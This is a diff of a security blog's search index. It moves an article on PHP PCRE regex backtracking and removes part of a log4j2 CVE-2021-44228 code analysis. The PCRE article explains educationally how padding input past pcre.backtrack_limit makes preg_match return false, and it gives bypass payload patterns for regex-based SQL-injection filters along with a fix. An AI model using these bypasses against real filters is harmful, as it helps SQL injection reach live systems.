@@ -255,6 +255,73 @@
 ]]></content>
   </entry>
   <entry>
+    <title>PHP的PCRE库回溯问题</title>
+    <url>/2021/10/12/PHP%E7%9A%84PCRE%E5%BA%93%E8%B4%AA%E5%A9%AA%E5%9B%9E%E6%BA%AF%E9%97%AE%E9%A2%98/</url>
+    <content><![CDATA[<p>最近发现对PCRE的回溯机制理解还是很模糊，决定再仔细复习记录下</p>
+<h2 id="DFA与NFA"><a href="#DFA与NFA" class="headerlink" title="DFA与NFA"></a>DFA与NFA</h2><p>先简单了解下DFA与NFA这两种正则引擎：DFA为确定性有穷自动机，是文本主导，NFA为非确定性有穷自动机，是表达式主导。</p>
+<p>DFA与NFA机制上的不同带来3种主要影响：</p>
+<ol>
+<li>DFA对于文本串里的每一个字符只需扫描一次，比较快，但特性较少；NFA要翻来覆去吃字符、吐字符，速度慢，但是特性丰富，所以反而应用广泛，当今主要的正则表达式引擎，如Perl、Ruby、Python的re模块、Java和.NET的regex库，都是NFA的。</li>
+<li>NFA急于邀功请赏，所以最左子正则式优先匹配成功，因此偶尔会错过最佳匹配结果；DFA则是“最长的左子正则式优先匹配成功”。</li>
+<li>NFA可能会陷入递归调用的陷阱而表现得性能极差。</li>
+</ol>
+<p><strong>针对第2点，这里举个例子来说明：</strong></p>
+<p>比如正则表达式<code>/aaa|aaabbb/</code>与字符串<code>aaabbbccc</code>匹配，在php和awk的匹配结果就不一样。</p>
+<p>php的pcre库是NFA引擎，<strong>匹配结果是aaa</strong>。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php &gt; preg_match(<span class="string">&#x27;/aaa|aaabbb/&#x27;</span>,<span class="string">&#x27;aaabbbccc&#x27;</span>,<span class="variable">$matches</span>);</span><br><span class="line">php &gt; print_r(<span class="variable">$matches</span>);</span><br><span class="line"><span class="keyword">Array</span></span><br><span class="line">(</span><br><span class="line">    [<span class="number">0</span>] =&gt; aaa</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<p>awk使用的是DFA引擎，这里通过awk的sub函数将正则匹配中的内容替换为<code>(replace)</code>，可以看到<strong>匹配中的是aaabbb</strong>。</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">root@p0melo:/tmp<span class="comment"># cat 1.txt</span></span><br><span class="line">aaabbbccc</span><br><span class="line">root@p0melo:/tmp<span class="comment"># awk &#x27;sub(/aaa|aaabbb/,&quot;(replace)&quot;)&#x27; 1.txt</span></span><br><span class="line">(replace)ccc</span><br><span class="line">root@p0melo:/tmp<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<p>所以说NFA是最左子式匹配，而DFA是最长左子式匹配。</p>
+<p>针对第1和第3点递归和性能的影响，就不得不提到NFA匹配的回溯机制。</p>
+<h2 id="贪婪模式与非贪婪模式"><a href="#贪婪模式与非贪婪模式" class="headerlink" title="贪婪模式与非贪婪模式"></a>贪婪模式与非贪婪模式</h2><p>正则表达式具有下面量词就是贪婪模式，在量词后面直接加上一个问号？就是非贪婪模式。</p>
+<p>　　量词：{m,n}：m到n个</p>
+<p>　　　　　*：任意多个</p>
+<p>　　　　　+：一个到多个</p>
+<p>　　　　　？：0或一个</p>
+<p>这里我们举个贪婪模式的例子，表达式<code>/.*a/</code>与<code>aaabbb</code>匹配，由于是<strong>贪婪模式</strong>，<code>.*</code>会把aaabbb全部吃掉，然后再从最后一个b往回吐，一直吐到第3个a时匹配上了，所以返回aaa。我们可以通过<a class="link"   href="https://regex101.com/debugger" >在线工具<i class="fas fa-external-link-alt"></i></a>debug下匹配步骤，可以看到，第7步吐到了字符串第3个a的位置，第8步表达式最后一个a与字符串的第3个a匹配才配成功，表达式匹配完了也就停止了，所以匹配结果是aaa。</p>
+<img src="/2021/10/12/PHP%E7%9A%84PCRE%E5%BA%93%E8%B4%AA%E5%A9%AA%E5%9B%9E%E6%BA%AF%E9%97%AE%E9%A2%98/image-20211012163831932.png" class="" title="image-20211012163831932">
+
+<p>并且会随着b的数量增多，吐（回溯）的次数也会增多。</p>
+<img src="/2021/10/12/PHP%E7%9A%84PCRE%E5%BA%93%E8%B4%AA%E5%A9%AA%E5%9B%9E%E6%BA%AF%E9%97%AE%E9%A2%98/image-20211012164041139.png" class="" title="image-20211012164041139">
+
+<p>再来看看<strong>非贪婪模式</strong>，正则改用<code>/.*?a/</code>，可以看到总共只需要匹配3步，在第1步<code>.*?</code>与字符串匹配时，由于是非贪婪模式，这里会把<code>.*?</code>放一放，优先用后面的表达式匹配，所以第2步表达式最后一个a与字符串第一个a匹配，匹配成功，然后往下匹配。</p>
+<img src="/2021/10/12/PHP%E7%9A%84PCRE%E5%BA%93%E8%B4%AA%E5%A9%AA%E5%9B%9E%E6%BA%AF%E9%97%AE%E9%A2%98/image-20211012164947050.png" class="" title="image-20211012164947050">
+
+<p>第3步表达式结束符与字符串第2个a匹配不上，匹配结束，所以匹配结果为a。</p>
+<img src="/2021/10/12/PHP%E7%9A%84PCRE%E5%BA%93%E8%B4%AA%E5%A9%AA%E5%9B%9E%E6%BA%AF%E9%97%AE%E9%A2%98/image-20211012170512722.png" class="" title="image-20211012170512722">
+
+<p>当我们字符串改为<code>bbbbbbbbbbbbbbbbba</code>，可以看到匹配步数增加到了20次，这是因为<code>.*?</code>为非贪婪模式，所以优先由表达式中的a与字符串第一个字符b匹配，匹配不上，再由<code>.*?</code>匹配，由于非贪婪模式，又优先a与第二个b匹配，匹配失败……一直重复，直到表达式a与字符串最后一个a匹配上为止。</p>
+<img src="/2021/10/12/PHP%E7%9A%84PCRE%E5%BA%93%E8%B4%AA%E5%A9%AA%E5%9B%9E%E6%BA%AF%E9%97%AE%E9%A2%98/image-20211013103334726.png" class="" title="image-20211013103334726">
+
+<p>所以通过这个例子可以看出来，贪婪模式和非贪婪模式都会有回溯机制。</p>
+<h2 id="回溯机制引发的问题"><a href="#回溯机制引发的问题" class="headerlink" title="回溯机制引发的问题"></a>回溯机制引发的问题</h2><p>上面例子的回溯次数会随着字符b的数量增加而增加，当回溯次数非常大时，就可能会导致拒绝服务攻击（redos），PHP给pcre设定了一个回溯次数上限pcre.backtrack_limit来防止redos问题。我们可以通过var_dump(ini_get(‘pcre.backtrack_limit’));的方式查看当前环境下的上限：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php &gt; var_dump(ini_get(<span class="string">&#x27;pcre.backtrack_limit&#x27;</span>));</span><br><span class="line"><span class="keyword">string</span>(<span class="number">7</span>) <span class="string">&quot;1000000&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>当回溯次数大于1000000会有什么问题呢？</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php &gt; var_dump(preg_match(<span class="string">&#x27;/.*a/s&#x27;</span>,<span class="string">&#x27;a&#x27;</span>.str_repeat(<span class="string">&#x27;b&#x27;</span>,<span class="number">1000000</span>)));  <span class="comment">// 贪婪模式</span></span><br><span class="line"><span class="keyword">bool</span>(<span class="literal">false</span>)</span><br><span class="line">php &gt; var_dump(preg_match(<span class="string">&#x27;/.*?a/s&#x27;</span>,str_repeat(<span class="string">&#x27;b&#x27;</span>,<span class="number">1000000</span>).<span class="string">&#x27;a&#x27;</span>));  <span class="comment">// 非贪婪模式</span></span><br><span class="line"><span class="keyword">bool</span>(<span class="literal">false</span>)</span><br></pre></td></tr></table></figure>
+
+<p>这里返回了false，并非正常匹配上返回的1，不匹配返回的0，官方文档也对这现象做出了解释：</p>
+<img src="/2021/10/12/PHP%E7%9A%84PCRE%E5%BA%93%E8%B4%AA%E5%A9%AA%E5%9B%9E%E6%BA%AF%E9%97%AE%E9%A2%98/image-20211013100741170.png" class="" title="image-20211013100741170">
+
+<p>所以我们也可以通过该特性绕过一些限制，比如基于php的waf：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/SELECT.+FROM.+/is&#x27;</span>, <span class="variable">$input</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;SQL Injection&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里可以输入类似<code>SELECT * FROM XXX /*aaaaaaa......</code>的payload使回溯次数超过限制，从而返回false绕过if判断，类似还有非贪婪模式的错误用法：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/UNION.+?SELECT/is&#x27;</span>, <span class="variable">$input</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;SQL Injection&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p> 可以使用<code>UNION/*aaaaa......*/SELECT</code>增加回溯次数来绕过限制。</p>
+<p><strong>修复方法</strong></p>
+<p>我们可以通过全等号来判断<code>preg_match</code>的返回值</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/UNION.+?SELECT/is&#x27;</span>, <span class="variable">$input</span>) === <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;SQL Injection&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a class="link"   href="https://blog.csdn.net/liuxiao723846/article/details/83308081" >正则引擎：DFA与NFA<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   href="https://blog.csdn.net/zpflwy1314/article/details/82665254" >DFA与NFA的比较<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html" >PHP利用PCRE回溯次数限制绕过某些安全限制<i class="fas fa-external-link-alt"></i></a></p>
+]]></content>
+  </entry>
+  <entry>
     <title>Oauth2.0安全问题</title>
     <url>/2022/05/13/Oauth2-0%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>开局一张图</p>
@@ -398,169 +465,6 @@
       </tags>
   </entry>
   <entry>
-    <title>PHP的PCRE库回溯问题</title>
-    <url>/2021/10/12/PHP%E7%9A%84PCRE%E5%BA%93%E8%B4%AA%E5%A9%AA%E5%9B%9E%E6%BA%AF%E9%97%AE%E9%A2%98/</url>
-    <content><![CDATA[<p>最近发现对PCRE的回溯机制理解还是很模糊，决定再仔细复习记录下</p>
-<h2 id="DFA与NFA"><a href="#DFA与NFA" class="headerlink" title="DFA与NFA"></a>DFA与NFA</h2><p>先简单了解下DFA与NFA这两种正则引擎：DFA为确定性有穷自动机，是文本主导，NFA为非确定性有穷自动机，是表达式主导。</p>
-<p>DFA与NFA机制上的不同带来3种主要影响：</p>
-<ol>
-<li>DFA对于文本串里的每一个字符只需扫描一次，比较快，但特性较少；NFA要翻来覆去吃字符、吐字符，速度慢，但是特性丰富，所以反而应用广泛，当今主要的正则表达式引擎，如Perl、Ruby、Python的re模块、Java和.NET的regex库，都是NFA的。</li>
-<li>NFA急于邀功请赏，所以最左子正则式优先匹配成功，因此偶尔会错过最佳匹配结果；DFA则是“最长的左子正则式优先匹配成功”。</li>
-<li>NFA可能会陷入递归调用的陷阱而表现得性能极差。</li>
-</ol>
-<p><strong>针对第2点，这里举个例子来说明：</strong></p>
-<p>比如正则表达式<code>/aaa|aaabbb/</code>与字符串<code>aaabbbccc</code>匹配，在php和awk的匹配结果就不一样。</p>
-<p>php的pcre库是NFA引擎，<strong>匹配结果是aaa</strong>。</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php &gt; preg_match(<span class="string">&#x27;/aaa|aaabbb/&#x27;</span>,<span class="string">&#x27;aaabbbccc&#x27;</span>,<span class="variable">$matches</span>);</span><br><span class="line">php &gt; print_r(<span class="variable">$matches</span>);</span><br><span class="line"><span class="keyword">Array</span></span><br><span class="line">(</span><br><span class="line">    [<span class="number">0</span>] =&gt; aaa</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
-
-<p>awk使用的是DFA引擎，这里通过awk的sub函数将正则匹配中的内容替换为<code>(replace)</code>，可以看到<strong>匹配中的是aaabbb</strong>。</p>
-<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">root@p0melo:/tmp<span class="comment"># cat 1.txt</span></span><br><span class="line">aaabbbccc</span><br><span class="line">root@p0melo:/tmp<span class="comment"># awk &#x27;sub(/aaa|aaabbb/,&quot;(replace)&quot;)&#x27; 1.txt</span></span><br><span class="line">(replace)ccc</span><br><span class="line">root@p0melo:/tmp<span class="comment">#</span></span><br></pre></td></tr></table></figure>
-
-<p>所以说NFA是最左子式匹配，而DFA是最长左子式匹配。</p>
-<p>针对第1和第3点递归和性能的影响，就不得不提到NFA匹配的回溯机制。</p>
-<h2 id="贪婪模式与非贪婪模式"><a href="#贪婪模式与非贪婪模式" class="headerlink" title="贪婪模式与非贪婪模式"></a>贪婪模式与非贪婪模式</h2><p>正则表达式具有下面量词就是贪婪模式，在量词后面直接加上一个问号？就是非贪婪模式。</p>
-<p>　　量词：{m,n}：m到n个</p>
-<p>　　　　　*：任意多个</p>
-<p>　　　　　+：一个到多个</p>
-<p>　　　　　？：0或一个</p>
-<p>这里我们举个贪婪模式的例子，表达式<code>/.*a/</code>与<code>aaabbb</code>匹配，由于是<strong>贪婪模式</strong>，<code>.*</code>会把aaabbb全部吃掉，然后再从最后一个b往回吐，一直吐到第3个a时匹配上了，所以返回aaa。我们可以通过<a class="link"   href="https://regex101.com/debugger" >在线工具<i class="fas fa-external-link-alt"></i></a>debug下匹配步骤，可以看到，第7步吐到了字符串第3个a的位置，第8步表达式最后一个a与字符串的第3个a匹配才配成功，表达式匹配完了也就停止了，所以匹配结果是aaa。</p>
-<img src="/2021/10/12/PHP%E7%9A%84PCRE%E5%BA%93%E8%B4%AA%E5%A9%AA%E5%9B%9E%E6%BA%AF%E9%97%AE%E9%A2%98/image-20211012163831932.png" class="" title="image-20211012163831932">
-
-<p>并且会随着b的数量增多，吐（回溯）的次数也会增多。</p>
-<img src="/2021/10/12/PHP%E7%9A%84PCRE%E5%BA%93%E8%B4%AA%E5%A9%AA%E5%9B%9E%E6%BA%AF%E9%97%AE%E9%A2%98/image-20211012164041139.png" class="" title="image-20211012164041139">
-
-<p>再来看看<strong>非贪婪模式</strong>，正则改用<code>/.*?a/</code>，可以看到总共只需要匹配3步，在第1步<code>.*?</code>与字符串匹配时，由于是非贪婪模式，这里会把<code>.*?</code>放一放，优先用后面的表达式匹配，所以第2步表达式最后一个a与字符串第一个a匹配，匹配成功，然后往下匹配。</p>
-<img src="/2021/10/12/PHP%E7%9A%84PCRE%E5%BA%93%E8%B4%AA%E5%A9%AA%E5%9B%9E%E6%BA%AF%E9%97%AE%E9%A2%98/image-20211012164947050.png" class="" title="image-20211012164947050">
-
-<p>第3步表达式结束符与字符串第2个a匹配不上，匹配结束，所以匹配结果为a。</p>
-<img src="/2021/10/12/PHP%E7%9A%84PCRE%E5%BA%93%E8%B4%AA%E5%A9%AA%E5%9B%9E%E6%BA%AF%E9%97%AE%E9%A2%98/image-20211012170512722.png" class="" title="image-20211012170512722">
-
-<p>当我们字符串改为<code>bbbbbbbbbbbbbbbbba</code>，可以看到匹配步数增加到了20次，这是因为<code>.*?</code>为非贪婪模式，所以优先由表达式中的a与字符串第一个字符b匹配，匹配不上，再由<code>.*?</code>匹配，由于非贪婪模式，又优先a与第二个b匹配，匹配失败……一直重复，直到表达式a与字符串最后一个a匹配上为止。</p>
-<img src="/2021/10/12/PHP%E7%9A%84PCRE%E5%BA%93%E8%B4%AA%E5%A9%AA%E5%9B%9E%E6%BA%AF%E9%97%AE%E9%A2%98/image-20211013103334726.png" class="" title="image-20211013103334726">
-
-<p>所以通过这个例子可以看出来，贪婪模式和非贪婪模式都会有回溯机制。</p>
-<h2 id="回溯机制引发的问题"><a href="#回溯机制引发的问题" class="headerlink" title="回溯机制引发的问题"></a>回溯机制引发的问题</h2><p>上面例子的回溯次数会随着字符b的数量增加而增加，当回溯次数非常大时，就可能会导致拒绝服务攻击（redos），PHP给pcre设定了一个回溯次数上限pcre.backtrack_limit来防止redos问题。我们可以通过var_dump(ini_get(‘pcre.backtrack_limit’));的方式查看当前环境下的上限：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php &gt; var_dump(ini_get(<span class="string">&#x27;pcre.backtrack_limit&#x27;</span>));</span><br><span class="line"><span class="keyword">string</span>(<span class="number">7</span>) <span class="string">&quot;1000000&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>当回溯次数大于1000000会有什么问题呢？</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php &gt; var_dump(preg_match(<span class="string">&#x27;/.*a/s&#x27;</span>,<span class="string">&#x27;a&#x27;</span>.str_repeat(<span class="string">&#x27;b&#x27;</span>,<span class="number">1000000</span>)));  <span class="comment">// 贪婪模式</span></span><br><span class="line"><span class="keyword">bool</span>(<span class="literal">false</span>)</span><br><span class="line">php &gt; var_dump(preg_match(<span class="string">&#x27;/.*?a/s&#x27;</span>,str_repeat(<span class="string">&#x27;b&#x27;</span>,<span class="number">1000000</span>).<span class="string">&#x27;a&#x27;</span>));  <span class="comment">// 非贪婪模式</span></span><br><span class="line"><span class="keyword">bool</span>(<span class="literal">false</span>)</span><br></pre></td></tr></table></figure>
-
-<p>这里返回了false，并非正常匹配上返回的1，不匹配返回的0，官方文档也对这现象做出了解释：</p>
-<img src="/2021/10/12/PHP%E7%9A%84PCRE%E5%BA%93%E8%B4%AA%E5%A9%AA%E5%9B%9E%E6%BA%AF%E9%97%AE%E9%A2%98/image-20211013100741170.png" class="" title="image-20211013100741170">
-
-<p>所以我们也可以通过该特性绕过一些限制，比如基于php的waf：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/SELECT.+FROM.+/is&#x27;</span>, <span class="variable">$input</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;SQL Injection&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>这里可以输入类似<code>SELECT * FROM XXX /*aaaaaaa......</code>的payload使回溯次数超过限制，从而返回false绕过if判断，类似还有非贪婪模式的错误用法：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/UNION.+?SELECT/is&#x27;</span>, <span class="variable">$input</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;SQL Injection&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p> 可以使用<code>UNION/*aaaaa......*/SELECT</code>增加回溯次数来绕过限制。</p>
-<p><strong>修复方法</strong></p>
-<p>我们可以通过全等号来判断<code>preg_match</code>的返回值</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/UNION.+?SELECT/is&#x27;</span>, <span class="variable">$input</span>) === <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;SQL Injection&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a class="link"   href="https://blog.csdn.net/liuxiao723846/article/details/83308081" >正则引擎：DFA与NFA<i class="fas fa-external-link-alt"></i></a></p>
-<p><a class="link"   href="https://blog.csdn.net/zpflwy1314/article/details/82665254" >DFA与NFA的比较<i class="fas fa-external-link-alt"></i></a></p>
-<p><a class="link"   href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html" >PHP利用PCRE回溯次数限制绕过某些安全限制<i class="fas fa-external-link-alt"></i></a></p>
-]]></content>
-  </entry>
-  <entry>
-    <title>log4j2 RCE分析与复现</title>
-    <url>/2022/01/22/log4j2-RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/</url>
-    <content><![CDATA[<p>去年12月份爆出了<code>log4j2 RCE</code>的漏洞（<code>CVE-2021-44228</code>），该漏洞利用难度低，危害大，且影响范围广泛，这将有可能是载入安全史册的漏洞，作为史诗级漏洞的见证者，写个漏洞分析留个底还是有必要的😄</p>
-<h2 id="0x00-漏洞复现"><a href="#0x00-漏洞复现" class="headerlink" title="0x00 漏洞复现"></a>0x00 漏洞复现</h2><p>复现比较简单，先引入<code>log4j</code> 版本<code>2.14.1</code>的包，我这里配的是<code>lombok</code>+<code>sprint-boot-starter-log4j2</code>，<code>starter 2.5.7</code>依赖的是<code>2.14.1</code>版本的log4j</p>
-<img src="/2022/01/22/log4j2-RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20220123122258173.png" class="" title="image-20220123122258173">
-
-<p>或者换做直接引<code>log4j</code>的包也是OK的。</p>
-<img src="/2022/01/22/log4j2-RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20220219150315768.png" class="" title="image-20220219150315768">
-
-<p>通过JNDI注入利用<a class="link"   href="https://github.com/welk1n/JNDI-Injection-Exploit" >工具<i class="fas fa-external-link-alt"></i></a>在本地启动JNDI服务，根据项目JDK版本在<code>log.error</code>中插入对应payload即可触发</p>
-<img src="/2022/01/22/log4j2-RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20220123155520880.png" class="" title="image-20220123155520880">
-
-<h2 id="0x01-代码分析"><a href="#0x01-代码分析" class="headerlink" title="0x01 代码分析"></a>0x01 代码分析</h2><h3 id="日志记录"><a href="#日志记录" class="headerlink" title="日志记录"></a>日志记录</h3><p>跟入error方法，在<code>AbstractLogger</code>类的<code>logIfEnabled</code>方法中进行一层判断，满足了配置的log等级才输出日志</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">logIfEnabled</span><span class="params">(<span class="keyword">final</span> String fqcn, <span class="keyword">final</span> Level level, <span class="keyword">final</span> Marker marker, <span class="keyword">final</span> String message)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.isEnabled(level, marker, message)) &#123;</span><br><span class="line">        <span class="keyword">this</span>.logMessage(fqcn, level, marker, message);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>跟到<code>isEnabled</code>方法下面看看是怎么判断，可以看到filter方法中302行会判断传入的level是否大于配置的level，日志输出等级从低到高是<code>All &lt; Trace &lt; Debug &lt; Info &lt; Warn &lt; Error &lt; Fatal &lt; OFF</code>，程序会打印高于或等于所设置级别的日志，而默认配置为<code>error</code>等级，这也就是为什么默认配置下<code>error</code>和<code>fatal</code>可以触发，而<code>debug/info/warn</code>触发不了的原因。</p>
-<img src="/2022/01/22/log4j2-RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20220123163628452.png" class="" title="image-20220123163628452">
-
-<p>我们也可以通过修改log4j2.xml配置来配置日志输出等级</p>
-<img src="/2022/01/22/log4j2-RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20220219145944559.png" class="" title="image-20220219145944559">
-
-<p>接着从<code>logMessage</code>方法往下跟到<code>AbstractOutputStreamAppender</code>类的<code>directEncodeEvent</code>方法，89行跟入<code>encode</code>方法</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">directEncodeEvent</span><span class="params">(<span class="keyword">final</span> LogEvent event)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 跟入</span></span><br><span class="line">    <span class="keyword">this</span>.getLayout().encode(event, <span class="keyword">this</span>.manager);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.immediateFlush || event.isEndOfBatch()) &#123;</span><br><span class="line">        <span class="keyword">this</span>.manager.flush();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>在<code>PatternLayout</code>类实现<code>encode</code>方法，接着关注<code>toText</code>方法</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">encode</span><span class="params">(<span class="keyword">final</span> LogEvent event, <span class="keyword">final</span> ByteBufferDestination destination)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!(<span class="keyword">this</span>.eventSerializer <span class="keyword">instanceof</span> Serializer2)) &#123;</span><br><span class="line">        <span class="keyword">super</span>.encode(event, destination);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 跟入toText方法</span></span><br><span class="line">        StringBuilder text = <span class="keyword">this</span>.toText((Serializer2)<span class="keyword">this</span>.eventSerializer, event, getStringBuilder());</span><br><span class="line">        Encoder&lt;StringBuilder&gt; encoder = <span class="keyword">this</span>.getStringBuilderEncoder();</span><br><span class="line">        encoder.encode(text, destination);</span><br><span class="line">        trimToMaxSize(text);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> StringBuilder <span class="title">toText</span><span class="params">(<span class="keyword">final</span> Serializer2 serializer, <span class="keyword">final</span> LogEvent event, <span class="keyword">final</span> StringBuilder destination)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> serializer.toSerializable(event, destination);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="消息格式化"><a href="#消息格式化" class="headerlink" title="消息格式化"></a>消息格式化</h3><p>跟入<code>toSerializable</code>方法，遍历类型为<code>org.apache.logging.log4j.core.pattern.PatternFormatter</code>类的<code>formatters</code>数组，调用其<code>format</code>方法，这里只需关注第8次循环的<code>format</code>方法，漏洞就是在这个<code>format</code>中触发</p>
-<img src="/2022/01/22/log4j2-RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20220123174526935.png" class="" title="image-20220123174526935">
-
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">format</span><span class="params">(<span class="keyword">final</span> LogEvent event, <span class="keyword">final</span> StringBuilder buf)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.skipFormattingInfo) &#123;</span><br><span class="line">        <span class="comment">// 第8次循环的converter实现为MessagePatternConverter类，跟入</span></span><br><span class="line">        <span class="keyword">this</span>.converter.format(event, buf);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.formatWithInfo(event, buf);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>再看看<code>MessagePatternConverter</code>中的<code>format</code>实现，在判断log内容包含<code>$&#123;</code>后，将<code>evet</code>带入的<code>replace</code>方法</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">format</span><span class="params">(<span class="keyword">final</span> LogEvent event, <span class="keyword">final</span> StringBuilder toAppendTo)</span> </span>&#123;</span><br><span class="line">    Message msg = event.getMessage();</span><br><span class="line">    <span class="keyword">if</span> (msg <span class="keyword">instanceof</span> StringBuilderFormattable) &#123;</span><br><span class="line">        <span class="keyword">boolean</span> doRender = <span class="keyword">this</span>.textRenderer != <span class="keyword">null</span>;</span><br><span class="line">        StringBuilder workingBuilder = doRender ? <span class="keyword">new</span> StringBuilder(<span class="number">80</span>) : toAppendTo;</span><br><span class="line">        <span class="keyword">int</span> offset = workingBuilder.length();</span><br><span class="line">        <span class="keyword">if</span> (msg <span class="keyword">instanceof</span> MultiFormatStringBuilderFormattable) &#123;</span><br><span class="line">            ((MultiFormatStringBuilderFormattable)msg).formatTo(<span class="keyword">this</span>.formats, workingBuilder);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            ((StringBuilderFormattable)msg).formatTo(workingBuilder);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.config != <span class="keyword">null</span> &amp;&amp; !<span class="keyword">this</span>.noLookups) &#123;  <span class="comment">// 2.14.1及一下版本的noLookups默认为false</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i = offset; i &lt; workingBuilder.length() - <span class="number">1</span>; ++i) &#123;</span><br><span class="line">                <span class="comment">// 判断log内容是否包含&#x27;$&#123;&#x27;</span></span><br><span class="line">                <span class="keyword">if</span> (workingBuilder.charAt(i) == <span class="string">&#x27;$&#x27;</span> &amp;&amp; workingBuilder.charAt(i + <span class="number">1</span>) == <span class="string">&#x27;&#123;&#x27;</span>) &#123;</span><br><span class="line">                    String value = workingBuilder.substring(offset, workingBuilder.length());</span><br><span class="line">                    workingBuilder.setLength(offset);</span><br><span class="line">                    <span class="comment">// 跟入replace方法</span></span><br><span class="line">                    workingBuilder.append(<span class="keyword">this</span>.config.getStrSubstitutor().replace(event, value));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
-
-<p>在<code>org.apache.logging.log4j.core.util.Constants</code>类中可以看到noLookpus默认为false</p>
